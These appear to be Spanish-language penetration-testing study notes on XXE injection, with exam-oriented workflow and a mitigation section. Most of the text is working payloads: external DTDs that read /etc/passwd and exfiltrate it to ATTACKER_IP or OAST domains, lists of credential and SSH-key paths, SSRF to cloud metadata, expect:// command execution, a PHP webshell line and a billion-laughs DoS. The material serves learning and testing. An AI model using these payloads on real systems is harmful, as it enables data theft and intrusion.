`TODO`: Reducir apuntes
Aparece cuando una aplicación procesa XML controlado por el usuario y el parser permite declarar o resolver entidades externas.

```text
Entrada XML controlable
  → parser acepta DTD / entities
  → entidad apunta a archivo, URL o wrapper
  → lectura local / SSRF / OOB / error-based / posible pivot a RCE
```

## Elementos de XML

Cuando podemos modificar una entrada XML, normalmente encontraremos o podremos introducir algunas de estas partes:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [
  <!ENTITY marker "XXE_OK">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>

<root>
  <message><![CDATA[Texto tratado literalmente]]></message>
  <data>&xxe;</data>
</root>
```


| Elemento         | Ejemplo                                                                   | Para qué interesa                                                                                                               |
| ---------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Declaración XML  | `<?xml version="1.0" encoding="UTF-8"?>`                                  | Define versión y encoding; no activa XXE. Es opcional                                                                           |
| Elemento raíz    | `<root>...</root>`                                                        | Elemento principal del documento; su nombre debe coincidir con el declarado en `DOCTYPE`                                        |
| `DOCTYPE`        | `<!DOCTYPE root [ DECLARACIONES_DTD ]>`                                   | Introduce la definición de tipo del documento e indica el elemento raíz esperado: `root`                                        |
| DTD              | `<!ELEMENT root (#PCDATA)>` / `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Conjunto de declaraciones: estructura, atributos, entities y notaciones                                                         |
| Entity general   | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` / `&xxe;`                     | Se referencia desde el cuerpo XML; útil para file disclosure, SSRF o callbacks                                                  |
| Parameter entity | `<!ENTITY % remote SYSTEM "http://ATTACKER/xxe.dtd">` / `%remote;`        | Se referencia dentro de la DTD; útil para cargar o construir declaraciones avanzadas                                            |
| CDATA            | `<![CDATA[ ... ]]>`                                                       | Trata el contenido como texto literal para que caracteres XML especiales <br>`<` , `>`,  `&` , `"`   `'`)no rompan el documento |



## Descubrimiento XXE

### Identificación de entrada

#### XML enviado directamente en el body

```http
POST /submitDetails.php HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?>
<root>
  <email>test@example.test</email>
</root>
```

#### SOAP

```http
POST /soap HTTP/1.1
Host: target
Content-Type: text/xml

<soapenv:Envelope>
  <soapenv:Body>
    ...
  </soapenv:Body>
</soapenv:Envelope>
```

#### API que utiliza JSON pero puede aceptar XML

Petición original:

```http
POST /api/check HTTP/1.1
Content-Type: application/json

{"id":"1"}
```

Prueba alternativa:

```http
POST /api/check HTTP/1.1
Content-Type: application/xml

<root>
  <id>1</id>
</root>
```

#### Otras superficies

```text
- Upload de SVG.
- Importación/exportación XML.
- SAML / metadata XML.
- RSS / Atom.
- XML-RPC.
- DOCX / XLSX / PPTX.
- Generadores PDF o conversores de documentos.
- Webhooks XML.
```

---

### Fuzzing para descubrimiento

#### Checklist inicial

```text
[ ] Identificar el elemento raíz real.
[ ] Identificar campos reflejados.
[ ] Añadir DOCTYPE antes del root.
[ ] Probar entity interna.
[ ] Probar entity externa local.
[ ] Probar callback HTTP/DNS.
[ ] Forzar errores del parser.
[ ] Probar SSRF si existe resolución externa.
[ ] Probar XML alternativo si originalmente se usa JSON.
```

#### Lluvia de payloads

| Objetivo                  | Payload clave                                              | Señal                                      |
| ------------------------- | ---------------------------------------------------------- | ------------------------------------------ |
| Entity interna            | `<!ENTITY marker "XXE_OK">` + `&marker;`                   | `XXE_OK` reflejado                         |
| Fichero local sencillo    | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                | Contenido del fichero                      |
| Error de entity           | `&doesNotExist;`                                           | Error del parser                           |
| OAST con general entity   | `<!ENTITY xxe SYSTEM "http://OAST_DOMAIN/ping">` + `&xxe;` | Callback                                   |
| OAST con parameter entity | `<!ENTITY % xxe SYSTEM "http://OAST_DOMAIN/ping"> %xxe;`   | Callback aunque bloqueen entities normales |
| SSRF local                | `http://127.0.0.1:PORT/`                                   | Respuesta interna / diferencia             |
| Source PHP                | `php://filter/convert.base64-encode/resource=...`          | Base64                                     |
| Blind con DTD externa     | `%remote;` a DTD controlada                                | Petición a `/xxe.dtd`                      |
| XInclude                  | `<xi:include parse="text" href="file:///etc/passwd"/>`     | Inclusión sin `DOCTYPE`                    |
| SVG                       | DTD dentro de fichero `.svg`                               | Lectura al procesar/renderizar             |

---

## Explotación XXE

### Local File Disclosure

#### Lectura directa Linux

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### Archivos Linux interesantes

```text
/etc/passwd
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/self/cwd/config.php
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
```

#### Qué buscar

```text
- Usuarios del sistema.
- Rutas de aplicación.
- Variables de entorno.
- Credenciales de base de datos.
- API keys.
- JWT secrets.
- Password reuse.
- Claves SSH.
- Endpoints internos.
```

---

### Source PHP mediante `php://filter`

#### Problema

Leer directamente un `.php` puede fallar porque el source contiene caracteres conflictivos para XML:

```xml
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
```

#### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>
```

#### Flujo

```text
index.php
  → php://filter lo codifica en Base64
  → el parser inserta una cadena XML-safe
  → se decodifica localmente
```

Decodificación:

```bash
echo 'PD9waHAgLi4u' | base64 -d
```

#### Uso recomendado

```text
- config.php
- index.php
- .env
- ficheros de conexión DB
- código de autenticación
- endpoints internos
```

---

### Lectura con CDATA + DTD externa

#### Cuándo usarlo

```text
- El fichero rompe XML.
- No quieres depender de php://filter.
- El backend no es PHP.
- Existe reflejo del contenido de una entidad.
- El target puede cargar una DTD externa.
```

#### Idea

Construir:

```text
&joined; = <![CDATA[ + CONTENIDO_DEL_FICHERO + ]]>
```

#### DTD externa: `xxe.dtd`

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Servidor atacante:

```bash
python3 -m http.server 8000
```

#### XML enviado

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY % end "]]>">
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>&joined;</root>
```

#### Modelo mental

```text
%begin;  = <![CDATA[
%file;   = contenido de index.php
%end;    = ]]>

xxe.dtd declara:
  &joined; = %begin; + %file; + %end;

El body utiliza:
  &joined;

Resultado:
  El source aparece tratado como texto literal.
```

#### Señal

```text
Código fuente reflejado sin errores XML provocados por <, > o &.
```

---

### Error-Based XXE

#### Cuándo probarlo

```text
- No hay campo reflejado.
- La aplicación muestra errores XML o excepciones del parser.
```

#### Test inicial

```xml
<root>&doesNotExist;</root>
```

Señal:

```text
Entity 'doesNotExist' not defined
libxml error
SAXParseException
Ruta local en stack trace
```

#### DTD externa: `xxe.dtd`

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM 'file:///nonexistent/%file;'>">
%error;
```

#### XML enviado

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>&content;</root>
```

#### Idea

```text
El parser construye una ruta inválida que contiene el fichero leído.
El error puede devolver esa ruta y filtrar el contenido.
```

#### Limitaciones

```text
- Ficheros grandes.
- Mensajes truncados.
- Caracteres que rompen la URI.
- Errores ocultos en producción.
```

---

### OAST / OOB de confirmación

#### Cuándo utilizarlo

```text
- No hay reflejo.
- No hay errores útiles.
- Se sospecha que el parser resuelve entidades externas.
```

#### HTTP callback mediante parameter entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ping SYSTEM "http://ATTACKER_IP:8000/xxe-check">
  %ping;
]>
<root>test</root>
```

Listener:

```bash
python3 -m http.server 8000
```

Señal:

```http
GET /xxe-check HTTP/1.1
```

Interpretación:

```text
El parser carga recursos externos y existe egress HTTP.
Todavía no se ha demostrado lectura de ficheros.
```

---

### OOB HTTP con entidad final en el body

Esta variante es útil para entender la cadena completa:

```text
DTD remota construye la entidad final.
Body XML referencia esa entidad y dispara el callback.
```

#### DTD externa: `xxe.dtd`

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

#### XML enviado

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

#### Flujo

```text
%remote;
  → descarga xxe.dtd

%file;
  → lee /etc/passwd codificado en Base64

%oob;
  → fabrica:
     <!ENTITY content SYSTEM "http://ATTACKER_IP:8000/?content=BASE64">

&content;
  → resuelve la URL anterior
  → envía los datos al listener
```

#### Callbacks esperados

```http
GET /xxe.dtd HTTP/1.1
```

Después:

```http
GET /?content=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo= HTTP/1.1
```

Decodificación:

```bash
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
```

---

### Por qué no declarar `content` directamente

#### Idea intuitiva pero problemática

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY content SYSTEM "http://ATTACKER_IP:8000/?content=%file;">
```

Problema:

```text
%file; está directamente dentro del literal SYSTEM final.
No se construye la URL con el contenido leído como se necesita.
```

#### Patrón correcto

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
%oob;
```

Modelo mental:

```text
%file;    obtiene el dato.
%oob;     fabrica una nueva ENTITY usando el dato.
&content; ejecuta la resolución HTTP final.
```

---

### OOB DTD-Only: variante PortSwigger

Esta variante no necesita utilizar una entidad final desde el body. Toda la cadena se ejecuta desde la DTD remota.

#### XML principal

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>test</root>
```

#### DTD externa: `xxe.dtd`

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OAST_DOMAIN/?x=%file;'>">
%eval;
%exfil;
```

#### Flujo

```text
%remote;
  → carga xxe.dtd

%file;
  → lee /etc/hostname

%eval;
  → fabrica una nueva parameter entity:
     <!ENTITY % exfil SYSTEM "http://OAST_DOMAIN/?x=CONTENIDO">

%exfil;
  → dispara el callback final desde la propia DTD
```

#### Por qué aparece `&#x25;`

```xml
&#x25;
```

representa el carácter:

```text
%
```

Se utiliza para generar `%exfil;` en una fase posterior del parsing, sin que el parser intente procesarlo antes de tiempo.

#### Diferencia frente a la variante anterior

|Variante|Entidad que dispara la exfiltración|Dónde se referencia|
|---|---|---|
|Entidad final en body|`&content;`|Dentro de `<root>...</root>`|
|DTD-only|`%exfil;`|Dentro de `xxe.dtd`|

```text
Con &content;:
  DTD construye → body ejecuta

DTD-only:
  DTD construye → DTD ejecuta
```

---

### DNS OOB

#### Cuándo probarlo

```text
- No se reciben callbacks HTTP.
- El target podría resolver DNS externamente.
- Se quiere confirmar blind XXE o exfiltrar valores pequeños.
```

#### Idea

Incorporar información en un subdominio:

```text
CONTENIDO.oast-domain.test
```

Patrón conceptual DTD-only:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.OAST_DOMAIN/'>">
%eval;
%exfil;
```

#### Usos prácticos

```text
- Confirmar resolución externa.
- Exfiltrar hostname.
- Exfiltrar pequeños identificadores o secretos.
```

#### Limitaciones

```text
- Restricciones de longitud DNS.
- Caracteres no válidos en labels.
- Necesidad de codificar/trocear datos.
- Caché DNS.
- Poco práctico para ficheros grandes.
```

Herramientas:

```text
- Burp Collaborator.
- Interactsh.
- DNS logger propio.
- tcpdump sobre infraestructura controlada.
```

---

### XXE como SSRF

#### Acceso a servicio local

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root>&xxe;</root>
```

#### Targets a probar

```text
http://127.0.0.1/
http://localhost/
http://127.0.0.1:8080/
http://127.0.0.1:8000/
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
```

#### Ideas de impacto

```text
- Paneles administrativos internos.
- APIs no expuestas externamente.
- Servicios de debug.
- Metadata cloud.
- Credenciales temporales.
```

---

### PHP `expect://`, si está habilitado

#### Condición

```text
La extensión PECL Expect debe estar instalada y el wrapper expect:// disponible.
No está habilitado por defecto.
```

#### Confirmación mínima

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

#### Señal

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Uso metodológico

```text
1. Probar una orden inocua como id.
2. Confirmar contexto de ejecución.
3. Identificar permisos, webroot y egress.
4. Valorar una cadena posterior más estable.
```

---

### De XXE a RCE: ideas de pivot

XXE no implica automáticamente ejecución de código.

```text
XXE suele dar:
  - lectura de archivos
  - SSRF
  - OOB callbacks

RCE requiere:
  - wrapper ejecutable;
  - credenciales reutilizables;
  - escritura de archivos;
  - include posterior;
  - panel interno vulnerable;
  - cadena secundaria.
```

#### Cadenas habituales

|Cadena|Condición|
|---|---|
|Leer `.env` / `config.php` → credenciales admin|Secretos accesibles|
|Leer clave SSH → acceso al host|Clave existente y utilizable|
|SSRF → panel interno → función peligrosa|Servicio interno vulnerable|
|SSRF → metadata cloud → credenciales|Entorno cloud mal protegido|
|`expect://id` → ejecución posterior|Wrapper habilitado|
|Contenido PHP + escritura/include|Primitive adicional de escritura o inclusión|

#### Webshell PHP: idea correcta

```php
<?php system($_REQUEST["cmd"]); ?>
```

Pero introducirla en XML mediante CDATA:

```xml
<message><![CDATA[<?php system($_REQUEST["cmd"]); ?>]]></message>
```

solo transporta texto.

```text
CDATA no ejecuta PHP.
Para ejecutar esa webshell, la aplicación tendría que guardarla como PHP
en una ubicación ejecutable o incluirla posteriormente.
```

---

## Automatización

### XXEinjector

Herramienta orientada a automatizar explotación XXE directa y OOB.

#### Instalación

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
```

#### Preparar request desde Burp

Guardar una petición en `/tmp/xxe.req` marcando el punto de inyección:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: target
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

#### Ejemplo OOB con PHP filter

```bash
ruby XXEinjector.rb \
  --host=ATTACKER_IP \
  --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http \
  --phpfilter
```

#### Opciones útiles

```text
--direct       Explotación directa con salida reflejada.
--oob          Exfiltración fuera de banda.
--phpfilter    Usa php://filter cuando aplica.
--cdata        Intenta técnicas basadas en CDATA.
--expect       Prueba ejecución con expect:// si existe.
--proxy        Envía tráfico a través de Burp.
--test         Pruebas iniciales.
--verbose      Más información de ejecución.
```

#### Uso recomendado

```text
1. Entender y validar manualmente el payload en Burp.
2. Automatizar después extracción repetitiva o enumeración.
```

---

## Variantes avanzadas

### XInclude

Útil cuando no controlamos el documento XML completo y no podemos añadir un `DOCTYPE`, pero nuestro input se inserta en un XML server-side.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Condición:

```text
El parser debe procesar XInclude.
```

---

### SVG Upload

SVG es XML. Si la aplicación procesa un `.svg` server-side, puede existir XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="50">
  <text x="0" y="20">&xxe;</text>
</svg>
```

Señal:

```text
Contenido local incluido en el renderizado o procesado del SVG.
```

---

### Cambio de `Content-Type`

Si la aplicación utiliza JSON, probar:

```http
Content-Type: application/xml
```

o:

```http
Content-Type: text/xml
```

Payload:

```xml
<root>
  <id>1</id>
</root>
```

Objetivo:

```text
Descubrir parsers XML ocultos o rutas backend alternativas.
```

---

### DTD local / repurposing

Escenario:

```text
- La DTD remota está bloqueada.
- Existen DTDs locales accesibles.
- El parser permite redefinir entities.
```

Uso:

```text
Reutilizar una DTD local para provocar error-based XXE o construir una cadena
cuando no es posible cargar recursos remotos directamente.
```

---

### Entity Expansion / Billion Laughs

Payload de DoS clásico:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a "LOL">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<root>&d;</root>
```

Uso:

```text
Solo para entender impacto o en laboratorio específico.
Muchos parsers modernos limitan la expansión de entities.
```

---

## Workflow Burp / HTB / CWES

```text
1. Localizar entrada XML real o formato XML aceptado.
2. Identificar el root correcto.
3. Identificar campos reflejados.
4. Probar entity interna.
5. Probar lectura local directa.
6. Si el fichero rompe XML:
     - PHP → php://filter
     - No PHP / source directo → CDATA + DTD externa
7. Si no hay reflejo:
     - provocar error
     - OAST HTTP/DNS
8. Si hay callback:
     - OOB exfiltration
     - SSRF interna
9. Buscar secretos:
     - .env
     - config.php
     - claves SSH
     - tokens
     - metadata cloud
10. Pivotar a impacto real:
     - admin
     - SSH
     - DB
     - RCE secundaria
```

---

## Evidencia útil para informe / examen

```text
[ ] Request original con XML controlable.
[ ] Payload de confirmación.
[ ] Respuesta reflejada o callback OAST.
[ ] Archivo sensible leído o endpoint interno accedido.
[ ] Técnica utilizada:
      - direct XXE
      - php://filter
      - CDATA
      - error-based
      - OOB
      - SSRF
[ ] Impacto real:
      - credenciales
      - source code
      - secretos
      - acceso interno
      - ejecución
[ ] Recomendación de mitigación.
```

---

## Errores comunes

|Error|Consecuencia|
|---|---|
|Usar `DOCTYPE email` cuando el root es `<root>`|Payload menos correcto y menos compatible|
|Añadir dos declaraciones `<?xml ...?>`|XML mal formado|
|Meter `DOCTYPE` dentro del root|La DTD no se procesa correctamente|
|Confundir `&entity;` con `%entity;`|Se utiliza en la zona incorrecta|
|Ver `/xxe.dtd` en el listener y asumir exfil completa|Solo demuestra carga de DTD|
|Intentar declarar directamente `content SYSTEM "...%file;"`|No se construye la URL final como se necesita|
|No probar `php://filter` en PHP|Se pierde lectura de source|
|No probar OAST en endpoints sin reflejo|Falso negativo|
|Intentar reverse shell antes de enumerar secretos|Cadena más frágil y difícil de depurar|
|Olvidar SVG/XInclude/Content-Type alternativo|Superficie perdida|

---

## Mitigación defendible

```text
- Deshabilitar DTDs cuando no sean necesarias.
- Deshabilitar external general entities.
- Deshabilitar external parameter entities.
- Deshabilitar carga de DTDs externas.
- Deshabilitar XInclude si no es requerido.
- No mostrar errores XML crudos.
- Limitar salida de red desde backends.
- Validar Content-Type y formatos esperados.
- Mantener parsers y librerías actualizados.
```

---

## Chuleta mínima

```text
&xxe;
  → entidad general usada en el body.

%remote;
  → parameter entity usada en la DTD para cargar xxe.dtd.

CDATA
  → evita que el contenido leído rompa XML.

php://filter
  → codifica source PHP en Base64.

Error-based
  → fuerza un error que contiene el dato.

OAST
  → confirma blind XXE mediante callback.

OOB con &content;
  → la DTD fabrica; el body dispara.

OOB DTD-only
  → la DTD fabrica y dispara.

expect://
  → posible RCE solo si el wrapper está habilitado.

Metodología:
  identificar → confirmar → leer → exfiltrar → pivotar → demostrar impacto.
```